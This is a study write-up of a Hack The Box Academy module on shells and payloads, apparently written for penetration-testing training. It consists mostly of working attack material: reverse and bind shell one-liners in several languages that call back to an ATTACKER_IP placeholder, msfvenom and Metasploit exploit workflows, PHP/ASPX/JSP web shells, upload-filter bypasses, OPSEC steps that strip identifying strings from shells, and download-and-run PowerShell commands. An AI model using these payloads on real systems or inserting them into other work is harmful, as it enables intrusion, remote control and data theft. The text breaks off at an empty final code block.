# HTB Academy — Module 08: Shells and Payloads

| Field | Details |
|---|---|
| **Platform** | Hack The Box Academy |
| **Module** | 08 — Shells and Payloads |
| **Difficulty** | Medium |
| **Type** | Offensive — Shell Access and Payload Delivery |
| **Date** | April 2026 |

---

## Module Overview

This module covers the complete lifecycle of gaining shell access on target systems — from understanding what a shell is, through payload crafting and delivery, to maintaining and upgrading sessions across Windows and Linux environments. Every technique in this module is a building block for every other module in the CPTS path: without reliable shell access there is no post-exploitation, no lateral movement, no privilege escalation.

**Core areas covered:**

| Area | Description |
|---|---|
| Shell types | Bind, reverse, and web shells — when to use each |
| Payload fundamentals | Staged vs stageless, payload formats |
| MSFVenom | Payload generation for every platform |
| Metasploit | Module types, workflow, Meterpreter commands |
| Windows infiltration | Fingerprinting, exploitation, file transfer |
| Linux infiltration | Fingerprinting, exploitation, enumeration |
| Shell upgrading | TTY stabilisation from limited shells |
| Web shells | PHP, ASPX, JSP — upload, interact, clean up |
| Laudanum | Pre-built injectable web shell collection |
| Antak | PowerShell ASPX web shell framework |

---

## Section 1 — Shell Fundamentals

### What Is a Shell

A shell is a program that provides a user interface to the operating system. In penetration testing, gaining a shell on a target means achieving interactive access to the target's OS through exploitation of a vulnerability or misconfiguration.

**The Three File Descriptors:**

| FD | Name | Purpose |
|---|---|---|
| 0 | stdin | Input — reads commands |
| 1 | stdout | Output — returns results |
| 2 | stderr | Error output |

**Shell types by OS:**

| Shell | OS | Notes |
|---|---|---|
| Bash | Linux/macOS | Most common — has /dev/tcp built in |
| sh/dash | Linux | Minimal POSIX shell — always available |
| Zsh | macOS/Linux | Default macOS since Catalina |
| PowerShell | Windows/Linux | .NET based — most capable on Windows |
| cmd.exe | Windows | Legacy — always available on any Windows |

### The Three Shell Categories in Pentesting

- **Reverse Shell** — Target connects back to attacker. Attacker listens first. Bypasses inbound firewall rules because the target initiates an outbound connection.
- **Bind Shell** — Target listens on a port. Attacker connects to the target. Useful for internal network pivoting where inbound rules are relaxed.
- **Web Shell** — Script uploaded to a web server. Commands sent via HTTP. Operates over port 80/443 — always allowed by firewalls.

---

## Section 2 — Bind Shells

The target opens a port and attaches a shell to it. The attacker connects to that port. The target becomes the server, the attacker becomes the client.

```bash
# TARGET runs:
nc -lvnp 4444 -e /bin/bash

# ATTACKER connects:
Hackerpatel007_1@htb[/htb]$ nc -nv TARGET_IP 4444
```

**When to use bind shells:**
- Internal network pivoting where the target is directly reachable
- When the target cannot reach the attacker machine (no outbound)
- Dual-homed machines exposing a new network segment

**Limitations:** Requires inbound firewall rules to allow the connection. The open port is accessible to anyone who discovers it — OPSEC risk. NAT prevents external access to internal bind shells.

### Bind Shell Commands

**Linux — FIFO (OpenBSD Netcat, no -e flag) — run on TARGET:**
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp 4444 > /tmp/f
```

**Linux — GNU Netcat (-e flag available) — run on TARGET:**
```bash
nc -lvnp 4444 -e /bin/bash
```

**Socat — full TTY instantly (best quality):**
```bash
# TARGET runs:
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# ATTACKER connects:
Hackerpatel007_1@htb[/htb]$ socat - TCP:TARGET_IP:4444
```

**Python 3 — run on TARGET:**
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",4444));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

**PowerShell Bind — run on TARGET (Windows):**
```powershell
powershell -nop -c "$listener = [System.Net.Sockets.TcpListener]4444;$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

**Attacker connects to any bind shell:**
```bash
Hackerpatel007_1@htb[/htb]$ nc -nv TARGET_IP 4444
```

---

## Section 3 — Reverse Shells

The attacker sets up a listener first. The target executes a payload that calls back to that listener. Bypasses inbound firewall restrictions because the target initiates an outbound connection — organisations must allow outbound for users to browse the internet.

```bash
# ATTACKER listens:
Hackerpatel007_1@htb[/htb]$ nc -lvnp 443

# TARGET executes:
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

**Port selection strategy:**

| Port | Reason to Use |
|---|---|
| 443 | HTTPS — almost never blocked outbound |
| 80 | HTTP — never blocked outbound |
| 53 | DNS — must be allowed everywhere |
| 8080 | Alt HTTP — common in enterprise |
| 4444 | Avoid in real engagements — known Meterpreter default |

### Reverse Shell One-Liners — Run on TARGET

**Bash:**
```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

**Bash alternate:**
```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'
```

**Netcat FIFO (OpenBSD — no -e flag):**
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ATTACKER_IP 443 > /tmp/f
```

**Netcat with -e (GNU Netcat):**
```bash
nc -e /bin/bash ATTACKER_IP 443
```

**Python 3:**
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

**Perl:**
```bash
perl -e 'use Socket;$i="ATTACKER_IP";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
```

**PHP:**
```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**Ruby:**
```bash
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ATTACKER_IP","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

**PowerShell — run on TARGET (Windows):**
```powershell
powershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',443);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**Socat — full TTY reverse shell (best quality):**
```bash
# ATTACKER listener:
Hackerpatel007_1@htb[/htb]$ socat file:`tty`,raw,echo=0 TCP-LISTEN:443

# TARGET connects back:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:443
```

**Standard Netcat listener — run on ATTACKER (Kali):**
```bash
Hackerpatel007_1@htb[/htb]$ sudo nc -lvnp 443
```

### TTY Stabilisation — Run Immediately After Catching Shell

```bash
# Step 1 — Spawn PTY (run on target shell)
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2 — Background the shell
CTRL+Z

# Step 3 — Fix local terminal settings (run on Kali)
Hackerpatel007_1@htb[/htb]$ stty raw -echo; fg

# Step 4 — Set terminal environment variables (run on target shell)
export TERM=xterm
export SHELL=bash
stty rows 38 columns 116
```

---

## Section 4 — Shell Anatomy and Terminal Emulators

### The Three Layer Stack

```
Layer 1 — Terminal Emulator (the window)
          MATE Terminal, Windows Terminal, Alacritty
          Renders text. Has no execution capability.

Layer 2 — Command Language Interpreter (the shell)
          Bash, PowerShell, Zsh, cmd.exe
          Parses commands. Makes system calls.

Layer 3 — OS Kernel
          Executes actual work. Manages hardware.
```

### Shell Identification Commands

**Linux — run on Kali:**
```bash
Hackerpatel007_1@htb[/htb]$ echo $0          # Current shell name
Hackerpatel007_1@htb[/htb]$ ps               # Shows shell process
Hackerpatel007_1@htb[/htb]$ env | grep SHELL # Configured login shell
Hackerpatel007_1@htb[/htb]$ cat /etc/shells  # All available shells
```

**Windows — run on target:**
```powershell
$PSVersionTable    # PowerShell version and edition
echo %COMSPEC%     # CMD interpreter path
```

### CMD vs PowerShell Decision Guide

| Use CMD When | Use PowerShell When |
|---|---|
| Target is Windows XP or older | .NET framework access needed |
| Simple net commands needed | Active Directory interaction |
| Execution policy may block PS | File downloads required |
| Stealth is priority (less logging) | Complex scripting needed |

---

## Section 5 — Payload Fundamentals

### What Is a Payload

A payload is the code that executes on the target after a vulnerability is exploited. The exploit is the key that opens the door. The payload is what walks through it.

```
EXPLOIT → gains code execution
PAYLOAD → uses that execution to establish shell access
SHELL   → the result of a successful payload
```

### Staged vs Stageless Payloads

**Staged (/ separator in Metasploit name):**
```
windows/x64/meterpreter/reverse_tcp
```
- Small stager (~200 bytes) sent first
- Stager calls back and downloads the full payload
- Requires Metasploit multi/handler to catch
- Best for: buffer overflows with limited buffer space

**Stageless (_ separator in Metasploit name):**
```
windows/x64/meterpreter_reverse_tcp
```
- Complete payload delivered in one shot
- Can use a raw nc listener for basic shells
- Best for: social engineering, USB delivery, low bandwidth environments

### Payload Format Reference

| Format | Use Case |
|---|---|
| exe | Windows executable |
| elf | Linux executable |
| dll | Windows DLL injection/hijacking |
| ps1 | PowerShell script |
| aspx | Windows IIS web shell |
| php | PHP web shell |
| raw | Shellcode for custom loaders |
| war | Java Tomcat deployment |
| hta | HTML Application (Windows) |
| msi | Windows Installer (AlwaysInstallElevated privesc) |

---

## Section 6 — Metasploit and MSFVenom

### Metasploit Module Types

| Type | Purpose |
|---|---|
| exploit | Exploits vulnerabilities for code execution |
| payload | Code that runs after exploit succeeds |
| auxiliary | Scanners, fuzzers, recon — no payload |
| post | Post-exploitation modules |
| encoder | Obfuscates payloads for AV evasion |

### Core MSFConsole Workflow

```bash
Hackerpatel007_1@htb[/htb]$ sudo msfconsole -q

msf6 > search type:exploit platform:windows smb ms17-010
msf6 > use exploit/windows/smb/ms17_010_psexec
msf6 > show options
msf6 > set RHOSTS TARGET_IP
msf6 > set LHOST tun0
msf6 > set LPORT 443
msf6 > exploit
```

### Meterpreter Core Commands

```
meterpreter > getuid              # Current user context
meterpreter > sysinfo             # Target OS and hostname
meterpreter > getpid              # Current process PID
meterpreter > ps                  # List all processes
meterpreter > migrate 1234        # Migrate to process PID 1234
meterpreter > shell               # Drop into native OS shell
meterpreter > hashdump            # Dump local SAM hashes
meterpreter > upload src dst      # Upload file to target
meterpreter > download src dst    # Download file from target
meterpreter > search -f name      # Search for file on target
meterpreter > background          # Send session to background
msf6 > sessions -l                # List all active sessions
msf6 > sessions -i 1              # Interact with session 1
```

### MSFVenom Payload Generation

```bash
# List available payloads
Hackerpatel007_1@htb[/htb]$ msfvenom -l payloads | grep windows
Hackerpatel007_1@htb[/htb]$ msfvenom -l formats

# Windows EXE — staged (requires multi/handler)
Hackerpatel007_1@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f exe -o shell.exe

# Windows EXE — stageless (catchable by nc)
Hackerpatel007_1@htb[/htb]$ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=443 -f exe -o shell.exe

# Windows HTTPS — bypasses DPI
Hackerpatel007_1@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=443 -f exe -o shell.exe

# Linux ELF — staged
Hackerpatel007_1@htb[/htb]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f elf -o shell.elf

# Linux ELF — stageless (catchable by nc)
Hackerpatel007_1@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f elf -o shell.elf

# PHP web shell
Hackerpatel007_1@htb[/htb]$ msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=443 -f raw -o shell.php

# ASPX web shell (IIS)
Hackerpatel007_1@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f aspx -o shell.aspx

# JSP web shell (Tomcat)
Hackerpatel007_1@htb[/htb]$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=443 -f war -o shell.war

# MSI payload (AlwaysInstallElevated privilege escalation)
Hackerpatel007_1@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f msi -o shell.msi

# Raw shellcode for custom loaders (C format)
Hackerpatel007_1@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f c

# Make ELF executable after generating
Hackerpatel007_1@htb[/htb]$ chmod +x shell.elf
```

### Multi/Handler Setup

```bash
Hackerpatel007_1@htb[/htb]$ sudo msfconsole -q
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST tun0
msf6 > set LPORT 443
msf6 > exploit -j   # -j runs as background job
```

---

## Section 7 — Windows Infiltration

### Fingerprinting Windows Targets

```bash
# TTL-based OS detection (TTL ~128 = Windows, ~64 = Linux)
Hackerpatel007_1@htb[/htb]$ ping -c 1 TARGET

# Nmap OS and version detection
Hackerpatel007_1@htb[/htb]$ sudo nmap -v -A -Pn TARGET

# SMB OS discovery
Hackerpatel007_1@htb[/htb]$ nmap -p 445 --script smb-os-discovery TARGET
```

### Notable Windows Vulnerabilities

| Vulnerability | CVE | Affected OS | Service |
|---|---|---|---|
| MS08-067 | — | XP/2003/Vista/2008 | SMB |
| EternalBlue | MS17-010 | Vista → Server 2016 | SMBv1 |
| PrintNightmare | CVE-2021-34527 | All Windows | Print Spooler |
| BlueKeep | CVE-2019-0708 | 2000 → Server 2008 R2 | RDP |
| Zerologon | CVE-2020-1472 | Domain Controllers | Netlogon |

### EternalBlue Attack Flow

```bash
# Step 1 — Scan for vulnerability
Hackerpatel007_1@htb[/htb]$ sudo msfconsole -q
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 > set RHOSTS TARGET_IP
msf6 > run

# Step 2 — Exploit
msf6 > use exploit/windows/smb/ms17_010_psexec
msf6 > set RHOSTS TARGET_IP
msf6 > set LHOST tun0
msf6 > set LPORT 443
msf6 > exploit

# Step 3 — Verify
meterpreter > getuid
# Expected: NT AUTHORITY\SYSTEM
```

### File Transfer to Windows

**Run on TARGET (Windows):**
```powershell
# PowerShell download
powershell -c "(New-Object Net.WebClient).DownloadFile('http://IP:8080/file.exe','C:\Windows\Temp\file.exe')"

# Certutil (LOLBin)
certutil -urlcache -split -f http://IP:8080/file.exe C:\Windows\Temp\file.exe
```

**Run on ATTACKER (Kali) — host the file:**
```bash
Hackerpatel007_1@htb[/htb]$ impacket-smbserver share /path/to/files -smb2support
```

**Run on TARGET — pull from SMB share:**
```cmd
copy \\ATTACKER_IP\share\file.exe C:\Windows\Temp\file.exe
```

### Windows Post-Exploitation Checklist

```cmd
whoami
whoami /priv
whoami /groups
systeminfo
ipconfig /all
net user
net localgroup administrators
netstat -ano
tasklist
reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
cmdkey /list
where /r C:\ flag.txt
where /r C:\ proof.txt
```

---

## Section 8 — Linux Infiltration

### Fingerprinting Linux Targets

```bash
# TTL detection (TTL ~64 = Linux)
Hackerpatel007_1@htb[/htb]$ ping -c 1 TARGET

# Full enumeration
Hackerpatel007_1@htb[/htb]$ nmap -sC -sV TARGET
Hackerpatel007_1@htb[/htb]$ nmap -v -A -Pn TARGET

# Distribution identification (from target shell)
cat /etc/os-release
uname -a
cat /etc/issue
```

### Common Linux Service Exploits

| Service | Version | CVE | Notes |
|---|---|---|---|
| vsftpd | 2.3.4 | — | Backdoor triggers on port 6200 |
| Apache | 2.4.49 | CVE-2021-41773 | Path traversal + RCE |
| Bash (Shellshock) | < 4.3 | CVE-2014-6271 | CGI RCE via environment variables |
| OpenSSH | 7.7 | CVE-2018-15473 | Username enumeration |

### rConfig 3.9.6 Exploit Flow

```bash
Hackerpatel007_1@htb[/htb]$ sudo msfconsole -q
msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
msf6 > set RHOSTS TARGET_IP
msf6 > set RPORT 443
msf6 > set SSL true
msf6 > set USERNAME admin
msf6 > set PASSWORD admin
msf6 > set LHOST tun0
msf6 > set LPORT 443
msf6 > exploit

# After Meterpreter session — stabilise
meterpreter > shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Linux Post-Exploitation Checklist

```bash
whoami && id
sudo -l
uname -a
cat /etc/os-release
cat /etc/passwd | grep /bin/bash
ip a && ip route
netstat -tulpn 2>/dev/null
ps aux
env
find / -perm -4000 -type f 2>/dev/null    # SUID binaries
find / -name "proof.txt" -o -name "root.txt" -o -name "user.txt" 2>/dev/null
curl http://ATTACKER_IP:8080/linpeas.sh | bash
```

---

## Section 9 — Spawning Interactive Shells

### Why This Is Needed

Web-based and service-based exploitation often lands a non-TTY shell. This breaks `sudo`, `su`, `vim`, `ssh`, and proper signal handling (CTRL+C kills the shell instead of the current command). A full TTY is required for effective post-exploitation.

### Check Available Languages First

```bash
which python python3 perl ruby php lua node awk vim find script socat 2>/dev/null
```

### Shell Spawning Methods — Try in This Order (run on TARGET shell)

```bash
# Python 3 (most common — available on most modern Linux)
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Python 2
python -c 'import pty; pty.spawn("/bin/bash")'

# Perl
perl -e 'exec "/bin/bash";'

# Ruby
ruby -e 'exec "/bin/bash"'

# AWK (almost always available)
awk 'BEGIN {system("/bin/bash")}'

# Find
find . -exec /bin/bash \; -quit

# Script command
script -qc /bin/bash /dev/null

# PHP
php -r 'system("/bin/bash");'

# Vim
vim -c ':!/bin/bash'

# Direct invocation (always works if /bin/bash exists)
/bin/bash -i
```

### Full TTY Upgrade Sequence

```bash
# 1 — Spawn PTY (on target shell)
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 2 — Background the shell
CTRL+Z

# 3 — Fix local terminal (on Kali)
Hackerpatel007_1@htb[/htb]$ stty raw -echo; fg

# 4 — Configure terminal environment (on target shell)
export TERM=xterm
export SHELL=bash
stty rows 38 columns 116
```

### Sudo NOPASSWD Instant Escalation

```bash
# Check sudo permissions
sudo -l

# If output shows: (ALL : ALL) NOPASSWD: ALL
sudo /bin/bash
sudo su
sudo -s

# Specific binary escalation via GTFOBins
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo perl -e 'exec "/bin/bash";'
sudo awk 'BEGIN {system("/bin/bash")}'
sudo find . -exec /bin/bash \; -quit
sudo vim -c ':!/bin/bash'
```

---

## Section 10 — Web Shells

### What Is a Web Shell

A script file uploaded to a web server that provides remote code execution through HTTP requests. Commands are sent via URL parameters or POST data and output is returned in the HTTP response.

**Key characteristics:**
- Operates over HTTP/HTTPS — always passes through firewalls
- Stateless — `cd` does not persist between requests
- Must be upgraded to a reverse shell for effective post-exploitation
- Delete within minutes of upgrading — do not leave on disk

### Server Language to Shell Language Mapping

| Web Server | OS | Shell Language |
|---|---|---|
| Apache | Linux | PHP (.php) |
| Nginx | Linux | PHP (.php) |
| IIS | Windows | ASPX (.aspx) |
| Tomcat | Linux/Windows | JSP (.jsp) |

### PHP Web Shells

```php
<!-- Minimal GET parameter -->
<?php system($_GET['cmd']); ?>

<!-- POST only (avoids commands appearing in web server logs) -->
<?php system($_POST['cmd']); ?>

<!-- Accepts both GET and POST -->
<?php system($_REQUEST['cmd']); ?>
```

**Interact via curl — run on Kali:**
```bash
# GET request
Hackerpatel007_1@htb[/htb]$ curl "http://TARGET/shell.php?cmd=whoami"

# POST request
Hackerpatel007_1@htb[/htb]$ curl -X POST "http://TARGET/shell.php" -d "cmd=whoami"

# HTTPS (ignore self-signed cert)
Hackerpatel007_1@htb[/htb]$ curl -k "https://TARGET/shell.php?cmd=id"

# URL-encode command automatically
Hackerpatel007_1@htb[/htb]$ curl --data-urlencode "cmd=ls -la /var/www/" http://TARGET/shell.php
```

### ASPX Web Shell (IIS / Windows)

```aspx
<%@ Page Language="C#"%><%@ Import Namespace="System.Diagnostics"%>
<script runat="server">
void Page_Load(object s,EventArgs e){
string cmd=Request.QueryString["cmd"];
if(cmd!=null){
Process p=new Process();
p.StartInfo.FileName="cmd.exe";
p.StartInfo.Arguments="/c "+cmd;
p.StartInfo.RedirectStandardOutput=true;
p.StartInfo.UseShellExecute=false;
p.Start();
Response.Write(p.StandardOutput.ReadToEnd());}}
</script>
```

### JSP Web Shell (Tomcat)

```jsp
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if(cmd != null){
Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line;
while((line = br.readLine()) != null) out.println(line);
}
%>
```

### File Upload Bypass Techniques

| Technique | Method |
|---|---|
| MIME type bypass | Change Content-Type to image/gif in Burp |
| Double extension | shell.php.jpg or shell.jpg.php |
| Alternative extensions | .php5 .phtml .phar .php7 |
| Magic bytes | Prepend GIF89a to PHP code |
| Case variation | shell.PhP (Windows IIS case-insensitive) |
| Null byte | shell.php%00.jpg (older PHP versions) |

### Upgrade Web Shell to Reverse Shell

```bash
# Start listener first (Kali)
Hackerpatel007_1@htb[/htb]$ sudo nc -lvnp 443

# Trigger reverse shell through web shell (Kali)
Hackerpatel007_1@htb[/htb]$ curl --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'" http://TARGET/shell.php

# Windows target — PowerShell one-liner through Antak/Laudanum interface
# Send via browser or Burp to avoid URL encoding issues
```

---

## Section 11 — Laudanum Web Shell Framework

A collection of ready-made injectable web shell files for multiple languages. Ships with Kali Linux. Includes shells, file browsers, DNS exfiltration tools, and proxy capabilities.

**Location:** `/usr/share/laudanum/`
**Languages:** asp, aspx, jsp, php, cfm, jspx, shtml

### Setup Workflow

```bash
# Copy shell — never modify originals
Hackerpatel007_1@htb[/htb]$ cp /usr/share/laudanum/aspx/shell.aspx ~/shells/report.aspx
Hackerpatel007_1@htb[/htb]$ cp /usr/share/laudanum/php/shell.php ~/shells/image.php

# Get your VPN IP
Hackerpatel007_1@htb[/htb]$ MYIP=$(ip a show tun0 | grep inet | awk '{print $2}' | cut -d/ -f1)

# Set IP allowlist in the shell
Hackerpatel007_1@htb[/htb]$ sed -i "s/127.0.0.1/$MYIP/g" ~/shells/report.aspx

# Remove identifying comments (OPSEC)
Hackerpatel007_1@htb[/htb]$ sed -i '/^[[:space:]]*\/\//d' ~/shells/report.aspx
Hackerpatel007_1@htb[/htb]$ sed -i '/^[[:space:]]*$/d' ~/shells/report.aspx

# Verify no identifying strings remain
Hackerpatel007_1@htb[/htb]$ grep -i "laudanum\|author\|version" ~/shells/report.aspx
```

### /etc/hosts Entry for Lab Targets

```bash
# Add target
Hackerpatel007_1@htb[/htb]$ echo "TARGET_IP status.inlanefreight.local" | sudo tee -a /etc/hosts

# Remove when done
Hackerpatel007_1@htb[/htb]$ sudo sed -i '/inlanefreight/d' /etc/hosts
```

---

## Section 12 — Antak WebShell

A PowerShell-native ASPX web shell from the Nishang offensive PowerShell project. Executes commands through a PowerShell runspace rather than cmd.exe.

**Location:** `/usr/share/nishang/Antak-WebShell/antak.aspx`

**Advantages over Laudanum ASPX:**
- Full PowerShell and .NET framework access
- Built-in authentication (username + password)
- Fileless script execution in memory
- File upload and download in browser interface
- Command encoding for WAF bypass

### Setup Workflow

```bash
# Copy shell
Hackerpatel007_1@htb[/htb]$ cp /usr/share/nishang/Antak-WebShell/antak.aspx ~/shells/Upload.aspx

# Set credentials (line 14)
Hackerpatel007_1@htb[/htb]$ sed -i 's/YOURUSERNAME/sysadmin/' ~/shells/Upload.aspx
Hackerpatel007_1@htb[/htb]$ sed -i 's/YOURPASSWORD/P@ssw0rd123!/' ~/shells/Upload.aspx

# Remove identifying comments
Hackerpatel007_1@htb[/htb]$ sed -i '/^[[:space:]]*\/\//d' ~/shells/Upload.aspx

# Verify credentials are set
Hackerpatel007_1@htb[/htb]$ sed -n '14,16p' ~/shells/Upload.aspx

# Verify no identifying strings remain
Hackerpatel007_1@htb[/htb]$ grep -i "nishang\|antak\|author" ~/shells/Upload.aspx
```

### Key PowerShell Commands Through Antak (run in Antak browser interface)

```powershell
# Immediate enumeration
whoami
whoami /priv
whoami /groups
systeminfo
ipconfig /all
$PSVersionTable

# Find flags
Get-ChildItem -Path C:\ -Recurse -Filter "proof.txt" -EA SilentlyContinue
Get-ChildItem -Path C:\ -Recurse -Filter "*.txt" -EA SilentlyContinue | Select FullName

# Find credentials
Get-ChildItem -Path C:\ -Recurse -Filter "*password*" -EA SilentlyContinue
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Fileless script execution from memory
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8080/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 443
```

---

## Section 13 — PHP Web Shells: Content-Type Bypass

Some upload mechanisms validate file type using the client-supplied Content-Type header rather than independently verifying file contents. Intercepting the upload request in Burp Suite and changing `Content-Type: application/x-php` to `Content-Type: image/gif` causes the server to accept a PHP file as an image.

### Burp Suite Bypass Workflow

```
1. Start Burp:              burpsuite &
2. Configure browser proxy:  127.0.0.1:8080
3. Enable Intercept:         Proxy → Intercept → ON
4. Upload PHP shell via file upload form
5. In Burp request:          Find Content-Type: application/x-php
6. Change to:                Content-Type: image/gif
7. Click Forward
8. Disable Intercept
9. Access uploaded file at the known upload path
```

### PHP Dangerous Functions Reference

```php
system()     // Executes command — outputs directly to response
exec()       // Executes command — returns only last line of output
passthru()   // Executes command — raw binary output
shell_exec() // Execute via shell — returns complete output
`command`    // Backtick operator — equivalent to shell_exec()
popen()      // Open pipe to process
proc_open()  // Full process I/O control
eval()       // Execute arbitrary PHP code
```

---

## Engagement Setup Checklist

```bash
# 1 — Get VPN IP
Hackerpatel007_1@htb[/htb]$ ip a show tun0 | grep "inet " | awk '{print $2}' | cut -d/ -f1

# 2 — Prepare shells directory
Hackerpatel007_1@htb[/htb]$ mkdir -p ~/shells

# 3 — Prepare privesc tools
Hackerpatel007_1@htb[/htb]$ mkdir -p /opt/privesc && cd /opt/privesc
Hackerpatel007_1@htb[/htb]$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
Hackerpatel007_1@htb[/htb]$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe
Hackerpatel007_1@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
Hackerpatel007_1@htb[/htb]$ chmod +x linpeas.sh LinEnum.sh

# 4 — Prepare Laudanum shells with IP set
Hackerpatel007_1@htb[/htb]$ MYIP=$(ip a show tun0 | grep inet | awk '{print $2}' | cut -d/ -f1)
Hackerpatel007_1@htb[/htb]$ cp /usr/share/laudanum/aspx/shell.aspx ~/shells/report.aspx
Hackerpatel007_1@htb[/htb]$ cp /usr/share/laudanum/php/shell.php ~/shells/image.php
Hackerpatel007_1@htb[/htb]$ sed -i "s/127.0.0.1/$MYIP/g" ~/shells/report.aspx
Hackerpatel007_1@htb[/htb]$ sed -i "s/127.0.0.1/$MYIP/g" ~/shells/image.php

# 5 — Prepare Antak
Hackerpatel007_1@htb[/htb]$ cp /usr/share/nishang/Antak-WebShell/antak.aspx ~/shells/Upload.aspx
Hackerpatel007_1@htb[/htb]$ sed -i 's/YOURUSERNAME/sysadmin/' ~/shells/Upload.aspx
Hackerpatel007_1@htb[/htb]$ sed -i 's/YOURPASSWORD/P@ssw0rd123!/' ~/shells/Upload.aspx
```

---

## Web Shell Decision Guide

```
PHP server  (Linux/Apache)    → Laudanum PHP or minimal one-liner
ASPX server (Windows/IIS)     → Antak for full PowerShell features
                                Laudanum ASPX for basic commands
JSP server  (Tomcat)          → msfvenom WAR if Tomcat manager is accessible
                                Laudanum JSP for direct file upload
Any server (need Meterpreter) → msfvenom matching target platform/format
```

---

## Shell Cleanup After Each Engagement

```bash
# Delete web shell (Linux target — run from target shell)
rm -f /var/www/html/uploads/image.php

# Delete web shell (Windows target — from cmd.exe on target)
del C:\inetpub\wwwroot\files\report.aspx

# Verify deletion from Kali (404 = gone)
Hackerpatel007_1@htb[/htb]$ curl -s -o /dev/null -w "%{http_code}" http://TARGET/uploads/image.php

# Remove /etc/hosts entries (Kali)
Hackerpatel007_1@htb[/htb]$ sudo sed -i '/inlanefreight/d' /etc/hosts

# Document all deployed artifacts
Hackerpatel007_1@htb[/htb]$ echo "Shell: image.php | Path: /var/www/html/uploads/ | Deleted: $(date)" >> ~/engagement_log.txt
```

---

## Flag Locations Quick Reference

**Linux — run from target shell:**
```bash
find / -name "proof.txt" -o -name "root.txt" -o -name "user.txt" -o -name "local.txt" 2>/dev/null
```

**Windows CMD — run from target shell:**
```cmd
where /r C:\ proof.txt
where /r C:\ root.txt
where /r C:\ user.txt
```

**Windows PowerShell — run from target shell:**
```powershell
